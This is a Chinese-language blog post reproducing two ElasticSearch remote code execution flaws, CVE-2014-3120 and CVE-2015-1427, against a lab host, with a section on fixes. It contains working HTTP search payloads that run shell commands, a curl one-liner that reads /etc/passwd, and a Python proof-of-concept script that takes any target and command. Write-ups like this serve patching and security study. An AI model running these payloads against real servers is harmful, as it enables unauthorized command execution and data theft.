---
title: 	ElasticSearch命令执行漏洞复现
date: 2019-07-03 16:01:28
categories: 中间件漏洞
tags: 漏洞复现

---
<blockquote class="blockquote-center">只有自己强大优秀，面对真挚的感情时才不会唯唯诺诺。</blockquote>
<div class="aplayer" data-id="26418130" data-server="netease" data-type="song" data-mode="single"></div>
# ElasticSearch 命令执行漏洞（CVE-2014-3120）

## 漏洞简介:

Elasticsearch是一个高度可扩展的开源全文搜索和分析引擎。它允许您快速，近实时地存储，搜索和分析大量数据。它通常用作底层引擎/技术，为具有复杂搜索功能和要求的应用程序提供支持。

ElasticSearch其有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。但其用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。

而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户可以直接通过http请求，执行任意代码。

其实官方是清楚这个漏洞的，在文档里有说明：

```
First, you should not run Elasticsearch as the root user, as this would allow a script to access or do anything on your server, without limitations. Second, you should not expose Elasticsearch directly to users, but instead have a proxy application inbetween.

首先,不应以 root 用户身份运行 Elasticsearch,因为这将允许脚本访问或执行服务器上的任何操作,不受限制。其次,不应直接向用户公开弹性搜索,而应在中间有一个代理应用程序。
```

MVEL执行命令的代码如下：

```
import java.io.*;
new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next();
```

## 影响版本:

ElasticSearch 1.2及其之前的版本

## 漏洞复现:

首先判断其目标系统存在elasticsearch,其版本为1.1.1

```
[root@localhost ~]# curl http://192.168.15.130:9200
{
  "status" : 200,
  "name" : "Jack of Hearts",
  "version" : {
    "number" : "1.1.1",
    "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
    "build_timestamp" : "2014-04-16T14:27:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.7"
  },
  "tagline" : "You Know, for Search"
}
```

因为该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

![](https://ae01.alicdn.com/kf/HTB1zYVUdQxz61VjSZFr760eLFXak.png)

然后，插入payload去执行代码：

```
POST /_search?pretty HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

![](https://ae01.alicdn.com/kf/HTB1pah8e.GF3KVjSZFo762mpFXaO.png)

## 修复方法

1.关掉执行脚本功能，在配置文件elasticsearch.yml里为每一个结点都加上：

```java
script.disable_dynamic: true
```

2.升级到最新系统





# ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）

## 漏洞背景:

在2014年爆出的(CVE-2014-3120)漏洞，漏洞产生的原因是由于搜索引擎支持使用脚本代码(MVEL)作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意Java代码，后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行,也即是我们这次复现的漏洞:ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427）。

## 影响版本:

影响版本是Elasticsearch 1.3.0-1.3.7 和 1.4.0-1.4.2 的Groovy 脚本引擎存在漏洞。

这个漏洞允许攻击者构造Groovy脚本绕过沙箱检查执行shell命令。

目前已修复的版本是Elasticsearch 1.3.8 和 1.4.3，建议用户更新到最新版本。

## 漏洞复现:

### 攻击思路:

ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：

1. 既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射
2. Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言

所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。

Java沙盒绕过法：

```
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()
```

Goovy直接执行命令法：

```
def command='id';def res=command.execute().text;res
```

### 漏洞测试:

首先先判断目标系统的elasticsearch是否可以正常访问

![](https://ae01.alicdn.com/kf/HTB1vBNZe9SD3KVjSZFK76210VXaB.png)

由于查询时至少要求es中有一条数据，所以我们发送如下数据包，增加一个数据：

```
POST /website/blog/ HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

![](https://ae01.alicdn.com/kf/HTB1eDNLdQxz61VjSZFt761DSVXag.png)

然后发送包含payload的数据包，执行任意命令：

```
POST /_search?pretty HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

![](https://ae01.alicdn.com/kf/HTB1CEd7eW1s3KVjSZFA760_ZXXar.png)

也可以使用火狐的插件hackbar去发送post数据包实现命令执行

![](https://ae01.alicdn.com/kf/HTB15fN5e8Kw3KVjSZFO761rDVXaV.png)

或者使用curl去发送数据包实现命令执行

```
curl -XPOST http://ip:9200/_search?pretty=true -d '{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}'
```

​		python编写的POC

```
#!/usr/bin/env python
#-*-coding:utf-8-*-
import urllib
import urllib2
import json
import sys
def execute(url,command):
parameters = {
                "size":1,
                "script_fields":
                {"iswin":
                        {
                            "script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).\newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.\class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\").\getInputStream())).readLines()" % command,
                            "lang": "groovy"
                        }
                }
            }
data = json.dumps(parameters)
try:
    request=urllib2.Request(url+"_search?pretty",data)
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36')
    response=urllib2.urlopen(request)
    result = json.loads(response.read())["hits"]["hits"][0]["fields"]["iswin"][0]
for i in result:
    print i
except Exception, e:
    print e
if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "usage %s url command" % sys.argv[0]
    else:
        execute(sys.argv[1],sys.argv[2])
```

用法:

```
python Elasticsearch.py target ifconfig
python Elasticsearch.py target 'uname -a'
```

## 修复方法:

关闭groovy沙盒以已停止动态脚本的使用：

```
script.groovy.sandbox.enabled: false
```

### 安全建议:

- elasticsearch禁止向外网开放
- elasticsearch在启动的时候以非root用户启动.
- 如果业务需要外网开放时,增加严格权限验证
- 关注官方动态,使用最新版本

